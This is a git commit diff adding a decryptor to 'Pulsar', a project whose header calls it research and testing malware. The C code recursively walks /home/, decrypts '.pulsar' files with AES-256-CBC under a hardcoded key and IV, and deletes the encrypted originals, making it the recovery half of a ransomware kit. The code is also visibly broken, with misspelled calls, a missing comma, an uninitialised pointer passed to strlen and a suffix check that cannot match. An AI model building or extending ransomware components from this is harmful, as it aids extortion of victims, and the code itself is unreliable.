d426567e6c6ade51ab826471ad625567fbabdeff
Timo S <58859419+timo-cmd@users.noreply.github.com>
2020-11-03 10:06:46 +0100

    Update decrypt.c

--- sources/decrypt.c
+++ sources/decrypt.c
@@ -24,21 +24,110 @@
 * AS A RESEARCH AND TESTING MALWARE. THE PULSAR DISTRIBUTION IS NOT INTENDED FOR 
 * ANY MALICIOUS PUPOSES. ITS ALL TESTING.
 */
-
-#include <errno.h>
+#include <string.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-#include <stdarg.h>
 #include <dirent.h>
-#include <sys/types.h>
+#include <openssl/evp.h>
+#include <openssl/aes.h>
 
-#define AND &
-#define XOR ^
-#define NOT !
 
-int i = 0;
+void decryptfile( FILE * fpin, FILE * fpout, unsigned char* key, unsigned char* iv ); 
+// declare file-process-input, file-process-output, key and iv
+void ls_dir( char* start_path );
 
-int main() {
-  return 0;
+void main(  ) {
+    char* start_path;
+    start_path = "/home/";
+    ls_dir( start_path );
+    // some small important vars 
 }
+
+void ls_dir( char* start_path ) {
+    unsigned char key[] = "12345678901234561234567890123456"; // declare a 32 char 256bit key
+    unsigned char iv[] = "1234567890123456"; // declare a 16 char 128bit key
+    DIR* dir;
+
+    struct dirent *ent;
+
+    if ( ( dir = opendir( start_path ) ) != NULL ) {// check if opened dir is not defined == NULL {
+        while ( ( ent = readdir( dir ) ) != NULL ) { // check if readdir is null 
+            if ( ent -> d_type == 8 ) { // check if d_type is 8bit long
+                int len = strlen( ent -> d_name );
+                const char* last_four = &ent -> d_name[ len - 4 ];
+                
+                if ( strcmp( last_four, ".pulsar" ) == 0 ) {
+                    char* full_path = ( char* ) malloc( strlen( full_path ) + 1 );
+                    stcpy( full_path, start_path );
+                    strcat( full_path, ent -> d_name );
+                    char* new_name = ( char* ) malloc( strlen( full_path ) + 1 );
+                    strcpy( new_name, full_path );
+
+                    new_name[ strlen( new_name ) - 4 ] = '\0';
+
+                    FILE* fpin;
+                    FILE* fpout;
+
+                    fpin = fopen( full_path, "rb" );
+                    fpout = fopen( new_name, "wb" );
+
+                    decryptfile( fpin, fpout, key, iv );
+                    if ( fpin != NULL )
+                        fclose( fpin );
+                    if ( fpout != NULL )
+                        fclose( fpout );
+
+                    remove( full_path );
+                    free( full_path );
+                    free( new_name );
+                }
+            }
+
+            if ( ent -> d_type == 4) {
+                char *full_path = ( char* ) malloc( strlen( start_path ) + strlen( ent -> d_name ) + 2 );
+                strcpy( full_path, start_path );
+                strcat( full_path, ent -> d_name );
+                strcat( full_path, "/" );
+
+                if ( full_path != start_path && ent -> d_name[ 0 ] != '.' ) {
+                    printf( "%S\n", full_path );
+                    ls_dir( full_path );
+                }
+
+                free( full_path );
+            }
+        }
+    }
+}
+
+void decryptfile( FILE * fpin, FILE * fpout, unsigned char* keym unsigned char* iv ) {
+    const unsigned bufsize = 4096; // bytes to read 
+    unsigned char* read_buf = malloc( bufsize ); // buffer to hold file text
+    unsigned char* cipher_buf; // decrypted text
+    unsigned blocksize;
+    int out_len;
+
+    EVP_CIPHER_CTX ctx;
+
+    EVP_CipherInit( &ctx, EVP_aes_256_cbc(  ), key, iv, 0 ); // 0 = decrypt | 1 = encrypt
+    blocksize = EVP_CIPHER_CTX_block_size( &ctx );
+    cipher_buf = malloc( bufsize + blocksize );
+
+    // read file and write encrypted file until eof error
+    while( 1 ) {
+        int bytes_read = fread( read_buf, sizeof( unsigned char ), bufsize, fpin );
+        EVP_CipherUpdate( &ctx, cipher_buf, &out_len, read_buf, bytes_read ); // encrypt everything 
+        fwrite( cipher_buf, sizeof( unsigned char ), out_len, fpout );
+
+        if ( bytes_read < bufsize ) {
+            break; // ERR: EOF to stdout
+        }
+    }
+
+    EVP_CipherFinal( &ctx, cipher_buf, &out_len );
+    fwrite( cipher_buf, sizeof( unsigned char ), out_len, fpout );
+
+    free( cipher_buf );
+    free( read_buf );
+}
+
